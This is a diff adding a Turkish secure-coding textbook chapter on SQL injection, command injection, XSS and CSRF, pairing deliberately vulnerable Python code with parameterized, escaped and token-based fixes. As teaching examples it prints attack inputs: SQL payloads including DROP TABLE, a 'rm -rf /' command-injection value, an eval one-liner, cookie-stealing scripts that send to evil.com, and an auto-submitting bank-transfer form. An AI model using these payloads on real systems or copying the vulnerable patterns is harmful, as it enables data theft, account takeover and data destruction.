@@ -1,0 +1,446 @@
+---
+layout: ../layouts/Chapter.astro
+title: 'Enjeksiyon Saldırıları ve Savunma'
+description: 'SQL injection, command injection, XSS, CSRF saldırılarının Python kod örnekleriyle analizi ve parametreli sorgu, çıktı kodlama, CSRF token ile savunma yöntemleri.'
+order: 56
+audience: B
+hero: '/img/hero/virus-ve-kotu-amacli-yazilimlar.webp'
+---
+
+import Alert from '../components/Alert.astro';
+import DoDont from '../components/DoDont.astro';
+import Checklist from '../components/Checklist.astro';
+import Scenario from '../components/Scenario.astro';
+import Accordion from '../components/Accordion.astro';
+
+
+Bir sabah, sitenin veritabanı boş. Loglarda tek satır var: `admin@app.com'; DROP TABLE users; --`. Bir kullanıcı, giriş formuna bu komutu yazdı. Kod, komutu veritabanına olduğu gibi gönderdi. Veritabanı da itaatle tüm kullanıcı tablosunu sildi.
+
+**Özlü kural:** Dışarıdan gelen veri ile programın komutlarını asla aynı yerde birleştirme. Veri veri olarak, komut komut olarak kalmalı.
+
+**Hızlı ipucu:** Kod tabanında `grep -ri "SELECT.*+\|INSERT.*+\|os.system\|eval(" .` çalıştır. Çıkan her satır, olası bir enjeksiyon noktasıdır.
+
+OWASP (Açık Web Uygulamaları Güvenlik Projesi, İng. Open Web Application Security Project) Top 10'un üçüncü maddesi enjeksiyondur. Bu bölümde en yaygın dört enjeksiyon türünü Python kod örnekleriyle inceliyoruz: SQL enjeksiyonu (SQL injection), komut enjeksiyonu (command injection), XSS (siteler arası betik çalıştırma, İng. Cross-Site Scripting) ve CSRF (siteler arası istek sahteciliği, İng. Cross-Site Request Forgery).
+
+## <span class="heading-num">56.1</span> SQL Injection
+
+SQL injection, saldırganın veritabanına SQL kodu enjekte etmesidir. Web tarihindeki en yıkıcı açıklardan biridir. Hala OWASP Top 10'dadır ve hala binlerce sitede bulunur.
+
+### Kötü Kod (Kırılgan)
+
+```python
+import sqlite3
+
+def get_user(email):
+    # DIKKAT: Bu kod güvensizdir!
+    # Kullanici girisi dogrudan SQL icine string birlestirme ile yaziliyor
+    query = "SELECT * FROM users WHERE email = '" + email + "'"
+    conn = sqlite3.connect('app.db')
+    cursor = conn.execute(query)
+    return cursor.fetchone()
+```
+
+Saldırgan `email` parametresi olarak şunu gönderir:
+
+```
+admin@app.com' OR '1'='1
+```
+
+SQL sorgusu şu hale gelir:
+
+```sql
+SELECT * FROM users WHERE email = 'admin@app.com' OR '1'='1'
+```
+
+`'1'='1'` her zaman doğrudur. Bu sorgu tüm kullanıcıları döndürür. Saldırgan tüm veritabanını okur.
+
+Daha kötüsü:
+
+```
+admin@app.com'; DROP TABLE users; --
+```
+
+Bu, users tablosunu siler (MySQL ve PostgreSQL'de çoklu sorgu desteğiyle; SQLite tek sorgu sınırı nedeniyle engelleyebilir ama koruma amaçlı yazılmış veritabanı sürücüleri her zaman güvenli değildir).
+
+### Doğru Kod (Güvenli)
+
+```python
+import sqlite3
+
+def get_user(email):
+    # GUVENLI: Parameterized query kullaniyoruz
+    # Soru isareti (?) bir yer tutucudur (placeholder)
+    # Veritabanı, query ile parametreyi ayrı işler, enjekte edilemez
+    query = "SELECT * FROM users WHERE email = ?"
+    conn = sqlite3.connect('app.db')
+    # Ikinci parametre olarak email'i TUPLE olarak veriyoruz
+    cursor = conn.execute(query, (email,))
+    return cursor.fetchone()
+```
+
+Parameterized query'de veritabanı motoru SQL metnini önce derler, sonra parametreleri yerleştirir. Parametre asla SQL kodu olarak yorumlanmaz. `email` değişkeni ne içerirse içersin, sadece bir veri olarak kabul edilir.
+
+<Alert level="critical">
+Python'da string formatlama (f-string, .format(), %) SQL sorgularında ASLA kullanılmamalıdır. Hepsi injection açığı oluşturur. String birleştirme (+) de aynı şekilde yasaktır. Veritabanı sürücüsünün parameterized query API'sini kullan.
+</Alert>
+
+**PostgreSQL örneği (psycopg2):**
+
+```python
+import psycopg2
+
+def get_user(email, conn):
+    # psycopg2'de once cursor olustur, sonra execute yap
+    # Connection.execute() sqlite3'de var ama psycopg2'de yok
+    cursor = conn.cursor()
+    cursor.execute(
+        "SELECT id, email, name FROM users WHERE email = %s",
+        (email,)  # tuple olarak ver
+    )
+    return cursor.fetchone()
+```
+
+<Accordion question="ORM kullanırsam SQL injection korunur mu?" id="orm-sql">
+Hayır, otomatik olarak değil. Django ORM, SQLAlchemy gibi ORM'ler parameterized query kullanır ve çoğu durumda korur. AMA raw SQL yazdığında (Django'da `raw()`, SQLAlchemy'de `text()`) yine string birleştirme yaparsan injection açığı oluşur. ORM kullanmak güvenlik garantisidir ama raw SQL'de aynı kurallar geçerlidir.
+</Accordion>
+
+## <span class="heading-num">56.2</span> Command Injection
+
+Command injection (komut enjeksiyonu), saldırganın uygulama üzerinden işletim sistemi komutu çalıştırmasıdır. Uygulama bir sistem komutu çağırıyorsa ve kullanıcı girdisi bu komuta dahil ediliyorsa, saldırgan kendi komutunu enjekte edebilir.
+
+### Kötü Kod (Kırılgan)
+
+```python
+import os
+
+def ping_host(host):
+    # DIKKAT: Bu kod güvensizdir!
+    # os.system kullanicidan gelen veriyi isletim sistemine gonderiyor
+    # Saldirgan host parametresine komut enjekte edebilir
+    os.system("ping -c 1 " + host)
+```
+
+Saldırgan `host` parametresi olarak şunu gönderir:
+
+```
+google.com; rm -rf /
+```
+
+İşletim sistemi şu komutu çalıştırır:
+
+```bash
+ping -c 1 google.com; rm -rf /
+```
+
+`;` işletim sisteminde "yeni komut başla" demektir. İkinci komut (`rm -rf /`) tüm dosyaları siler.
+
+### Doğru Kod (Güvenli)
+
+```python
+import subprocess
+
+def ping_host(host):
+    # GUVENLI: subprocess.run kullan + shell=False
+    # Argumanlari liste olarak ver, string olarak degil
+    # shell=False sayesinde metin komut olarak yorumlanmaz
+    subprocess.run(
+        ["ping", "-c", "1", host],
+        capture_output=True,
+        text=True,
+        timeout=5
+    )
+```
+
+`shell=False` ile her arguman ayrı bir liste elemanı olarak işletim sistemine iletilir. `host` değişkeni ne içerirse içersin, tek bir argüman olarak kabul edilir, komut olarak yorumlanmaz.
+
+<Alert level="warning">
+`os.system()` fonksiyonu Python'da güvenli kullanımın neredeyse imkansız olduğu bir fonksiyondur. Modern Python kodunda `os.system()` gördüğünde, bu bir güvenlik kokusudur (code smell). Yerine her zaman `subprocess.run(shell=False)` kullan.
+</Alert>
+
+**Ekstra savunma: input validation.** Host parametresinin gerçekten bir domain adı olduğunu doğrula:
+
+```python
+import re
+
+def validate_host(host):
+    # Sadece harf, rakam, nokta ve tire icerebilir
+    # ; | & $ ( ) gibi karakterler reddedilir
+    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
+        raise ValueError("Gecersiz host adresi")
+    return host
+
+def ping_host(host):
+    safe_host = validate_host(host)
+    subprocess.run(["ping", "-c", "1", safe_host], capture_output=True, timeout=5)
+```
+
+## <span class="heading-num">56.3</span> XSS (Cross-Site Scripting)
+
+XSS, saldırganın web sayfasına JavaScript kodu enjekte etmesidir. Kullanıcının tarayıcısı o kodu sayfanın parçası sanır ve çalıştırır. Çerezler (cookie) çalınabilir, oturum ele geçirilebilir, tuş vuruşları kaydedilebilir.
+
+Üç türü vardır:
+
+**Reflected XSS:** Kullanıcının URL'den gönderdiği veri, sayfaya yansıtılır. `https://site.com/search?q=<script>...</script>`
+
+**Stored XSS:** Saldırganın girdiği veri veritabanına kaydedilir ve her ziyaretçiye gösterilir. Yorum alanına JavaScript yazmak gibi. En tehlikeli türdür çünkü herkesi etkiler.
+
+**DOM-based XSS:** Sunucu değil, tarayıcıdaki JavaScript kodu kullanıcının verisini DOM'a yazar.
+
+### Kötü Kod (Kırılgan)
+
+```python
+# Flask ornegi - KOTU
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    # DIKKAT: Kullanici girisi dogrudan HTML icine yaziliyor
+    # Hiçbir encode/escape yapilmiyor
+    q = request.args.get('q', '')
+    return f'<h1>Arama sonuclari: {q}</h1>'
+```
+
+Saldırgan URL'ye şunu yazar:
+
+```
+/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+```
+
+Kullanıcının cookie'si saldırganın sitesine gönderilir.
+
+### Doğru Kod (Güvenli)
+
+**Çözüm 1: Otomatik escaping (Template engine)**
+
+Modern template engine'ler (Jinja2, Django Templates) varsayılan olarak HTML escaping uygular:
+
+```python
+# Flask + Jinja2 - GUVENLI (otomatik escape)
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    # Jinja2 {{ q }} ifadesi otomatik olarak HTML encode eder
+    # < becomes &lt;, > becomes &gt; vb.
+    return render_template_string('<h1>Arama sonuclari: {{ q }}</h1>', q=q)
+```
+
+**Çözüm 2: Manuel escaping**
+
+```python
+import html
+
+def render_search(q):
+    # html.escape() tehlikeli karakterleri HTML entity'lerine cevirir
+    # <  becomes  &lt;
+    # >  becomes  &gt;
+    # "  becomes  &quot;
+    # &  becomes  &amp;
+    safe_q = html.escape(q)
+    return f'<h1>Arama sonuclari: {safe_q}</h1>'
+```
+
+**JavaScript tarafında:**
+
+```javascript
+// KOTU: innerHTML kullanici verisini raw olarak yazar
+element.innerHTML = userInput  // XSS açığı!
+
+// DOGRU: textContent kullanici verisini metin olarak yazar
+element.textContent = userInput  // Guvenli
+
+// DOGRU: DOMPurify ile sanitize et (HTML izin veriyorsan)
+element.innerHTML = DOMPurify.sanitize(userInput)
+```
+
+<DoDont items={[
+  { text: 'Parameterized query kullan, string birleştirme', type: 'do' },
+  { text: 'subprocess.run(shell=False) kullan', type: 'do' },
+  { text: 'Template engine otomatik escaping güven', type: 'do' },
+  { text: 'Input validation whitelist ile yap', type: 'do' },
+  { text: 'innerHTML ile kullanıcının verisini yaz', type: 'dont' },
+  { text: 'os.system() veya shell=True kullan', type: 'dont' },
+  { text: 'f-string ile SQL sorgusu oluştur', type: 'dont' },
+  { text: 'eval() veya exec() ile kullanıcı verisi çalıştır', type: 'dont' },
+]} />
+
+## <span class="heading-num">56.4</span> CSRF (Cross-Site Request Forgery)
+
+CSRF, saldırganın kullanıcının haberi olmadan, kullanıcının oturumunu kullanarak sitede işlem yapmasıdır. Kullanıcı siteye giriş yapmıştır, aynı tarayıcıda saldırganın sitesini ziyaret eder. Saldırganın sitesi, kullanıcının tarayıcısından siteye istek gönderir. Tarayıcı çerezleri otomatik ekler ve site bu isteğin kullanıcıdan geldiğini sanar.
+
+**Örnek senaryo:** Kullanıcı bankada giriş yapmıştır. Başka bir sekmede kötü niyetli bir siteye girer. O sitenin içinde gizli bir form vardır:
+
+```html
+<!-- Saldirganin sitesindeki gizli form -->
+<!-- Kullanici gormez, ama tarayici bu formu bankaya gonderir -->
+<form action="https://bank.com/transfer" method="POST" id="evil-form">
+    <input type="hidden" name="to" value="saldirgan_hesap">
+    <input type="hidden" name="amount" value="100000">
+</form>
+<script>document.getElementById('evil-form').submit()</script>
+```
+
+Tarayıcı bankanın cookie'sini otomatik ekler. Banka "kullanıcı kendi istedi" der ve parayı transfer eder.
+
+### Savunma: CSRF Token
+
+```python
+# Flask ornegi - CSRF korumasi
+from flask import Flask, session, request
+import os
+import hmac
+
+app = Flask(__name__)
+app.secret_key = os.environ['FLASK_SECRET_KEY']  # Kodda DEGIL, environment variable'da
+
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    # 1. CSRF token kontrol et (sabit sureli karsilastirma - timing attack onlemi)
+    token = session.get('csrf_token', '')
+    form_token = request.form.get('csrf_token', '')
+    
+    if not hmac.compare_digest(token, form_token):
+        return "CSRF token gecersiz", 403
+    
+    # 2. Islemi gerceklestir
+    do_transfer(request.form['to'], request.form['amount'])
+    return "Transfer basarili"
+```
+
+Forma CSRF token eklenir:
+
+```html
+<form action="/transfer" method="POST">
+    <!-- Her form gonderiminde benzersiz token -->
+    <!-- Saldirgan bu token'i bilemez -->
+    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+    <input name="to" placeholder="Alıcı hesap">
+    <input name="amount" placeholder="Tutar">
+    <button type="submit">Gönder</button>
+</form>
+```
+
+**Ek savunma: SameSite cookie:**
+
+```python
+# Cookie'yi SameSite=Lax ile set et
+# Bu, baska siteden gelen isteklerde cookie gonderilmesini engeller
+response.set_cookie(
+    'session',
+    session_id,
+    httponly=True,     # JavaScript erisemesin
+    secure=True,       # Sadece HTTPS
+    samesite='Lax'     # Baska siteden gelen isteklerde cookie gonderme
+)
+```
+
+<Alert level="tip">
+Django ve Flask-WTF, CSRF korumasını varsayılan olarak açık getirir. Çerçevenin kendi CSRF korumasını kullan, kendi çözümünü yazma. Önemli olan: framework'ün CSRF korumasını kapatmamak.
+</Alert>
+
+## <span class="heading-num">56.5</span> Input Validation ve Output Encoding
+
+Tüm enjeksiyon türlerinin kök nedeni aynıdır: program, veriyi komuttan ayıramaz. Bu sorunu iki katmanda çözersin:
+
+### Input Validation (Giriş Doğrulama)
+
+Dışarıdan gelen her veriyi, beklenen formata uyması için doğrula. "Kullanıcı adı sadece harf ve rakam içerebilir" gibi bir kural koy ve uymayan veriyi reddet.
+
+```python
+import re
+from datetime import datetime
+
+def validate_email(email):
+    """Email formatini dogrula"""
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    if not re.match(pattern, email):
+        raise ValueError("Gecersiz email formati")
+    return email
+
+def validate_age(age_str):
+    """Yas degerini dogrula"""
+    try:
+        age = int(age_str)
+    except ValueError:
+        raise ValueError("Yas bir sayi olmali")
+    
+    if age < 0 or age > 150:
+        raise ValueError("Yas 0-150 arasinda olmali")
+    return age
+
+def validate_date(date_str):
+    """Tarih formatini dogrula (YYYY-MM-DD)"""
+    try:
+        return datetime.strptime(date_str, '%Y-%m-%d')
+    except ValueError:
+        raise ValueError("Tarih YYYY-MM-DD formatinda olmali")
+```
+
+**Kural: Beyaz liste (whitelist) yaklaşımı.** Hangi karakterlerin izinli olduğunu tanımla, diğerlerini reddet. "Hangi karakterleri yasaklayayım?" yaklaşımı (kara liste, blacklist) her zaman delik kalır. Çünkü saldırganın aklına gelmeyen bir karakter bulur.
+
+### Output Encoding (Çıkış Kodlaması)
+
+Veriyi nereye yazacağına göre farklı encode et. HTML'e yazarken HTML encode, SQL'e yazarken parameterized query, komut satırına yazarken argüman listesi:
+
+```python
+import html
+import json
+
+# HTML'e yazarken: HTML entity encode
+def render_in_html(user_input):
+    return html.escape(user_input)
+
+# JavaScript icine gomerken: JSON encode
+def render_in_js(user_input):
+    # JSON encode, JavaScript icin guvenli string uretir
+    return json.dumps(user_input)
+
+# URL'e yazarken: URL encode
+from urllib.parse import quote
+def render_in_url(user_input):
+    return quote(user_input, safe='')
+```
+
+<Alert level="info">
+Hangi encode'un kullanılacağı, verinin nereye gideceğine bağlıdır. HTML sayfasına giden veri HTML encode, JavaScript değişkenine giden veri JSON encode, URL parametresine giden veri URL encode edilir. Yanlış encode, yanlış koruma demektir.
+</Alert>
+
+<Accordion question="eval() ve exec() neden tehlikeli?" id="eval-danger">
+Python'da `eval()` ve `exec()` fonksiyonları string'i Python kodu olarak çalıştırır. Eğer bu string'in içinde kullanıcıdan gelen veri varsa, saldırgan Python kodu enjekte eder. `eval("__import__('os').system('rm -rf /')")` tek satırda sisteminizi siler. Altın kural: kullanıcı verisini ASLA eval() veya exec() fonksiyonuna verme. Hiçbir input validation bunu güvenli hale getiremez.
+</Accordion>
+
+<Accordion question="ORM kullanırsam SQL injection biter mi?" id="orm-again">
+ORM (Django ORM, SQLAlchemy) parameterized query kullandığı için çoğu durumda korur. Ama iki istisna var: 1) `raw()` veya `text()` ile ham SQL yazarsan ve string birleştirme yaparsan açık oluşur. 2) ORM'nin `extra()` veya `filter()` metodlarında bazı edge case'lerde injection olabilir. Kural: ORM kullan ama ham SQL'den kaçın. Kaçınılamazsa parameterized query kullan.
+</Accordion>
+
+<Scenario label="Senaryo: Stored XSS ile Oturum Çalma">
+Bir e-ticaret sitesinde ürün yorumları var. Kullanıcılar yorum yazabiliyor. Saldırgan, yorum alanına şunu yazıyor: `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. Site bu yorumu encode etmeden veritabanına kaydediyor ve diğer kullanıcılara gösteriyor. Her yorumu gören kullanıcının tarayıcısı bu JavaScript'i çalıştırıyor. Session cookie saldırganın sunucusuna gönderiliyor. Saldırgan bu cookie ile kullanıcının hesabına giriş yapıyor. Çözüm: template engine'in otomatik escaping'i açık olmalıydı. Ya da yorum render edilirken `html.escape()` uygulanmalıydı. Stored XSS, tek bir enjeksiyonla binlerce kullanıcıyı etkileyen en tehlikeli XSS türüdür.
+</Scenario>
+
+<Checklist title="Enjeksiyon Savunma Kontrol Listesi">
+<li>SQL sorgularında string birleştirme yok, parametreli sorgu (parameterized query) var</li>
+<li>os.system() yok, subprocess.run(shell=False) var</li>
+<li>Template engine otomatik escaping açık</li>
+<li>JavaScript tarafında innerHTML yok, textContent var</li>
+<li>Her formda CSRF token var</li>
+<li>Cookie'lerde SameSite=Lax veya Strict var</li>
+<li>eval() ve exec() kullanılmıyor</li>
+<li>Girdi doğrulama (input validation) beyaz liste yaklaşımıyla yapılıyor</li>
+<li>Çıktı kodlama (output encoding) hedef bağlama göre doğru yapılıyor</li>
+</Checklist>
+
+**Gerçek olay:** 2012'de LinkedIn, 6.5 milyon kullanıcının parolasını sızdırdı. Parolalar SHA-1 ile hash (özet)'lenmişti ama tuzsuz (unsalted). Saldırganlar, hazır rainbow table'larla dakikalar içinde milyonlarca parolayı kırdı. 2016'da sızıntının aslında 165 milyon parolayı kapsadığı ortaya çıktı. Ders: tek başına hash yetmez; tuz (salt) ve yavaş algoritma (bcrypt, Argon2) şarttır.
+
+**Benzetme:** Enjeksiyon, bir garsona sipariş verirken "ayrıca kasaya gidip bana 1000 TL ver" cümlesini siparişin içine gizlemektir. Garson iki talimatı tek bir sipariş sanar ve ikisini de uygular. Parametreli sorgu, garsona "bu kelimeler sipariş değil, sadece not" diye ayrı bir kağıda yazmayı öğretmektir.
+
+## İlgili Bölümler
+
+- [Güvenli Kodlama Temelleri](/guvenli-kodlama-temelleri/)
+- [Kimlik Doğrulama ve Oturum Yönetimi](/kimlik-dogrulama-ve-yetkilendirme/)
+- [Erişim Kontrolü ve API Güvenliği](/erisim-kontrolu-ve-api-guvenligi/)
+- [Tehdit Modelleme Çerçeveleri](/tehdit-modelleme-cerceveleri/)
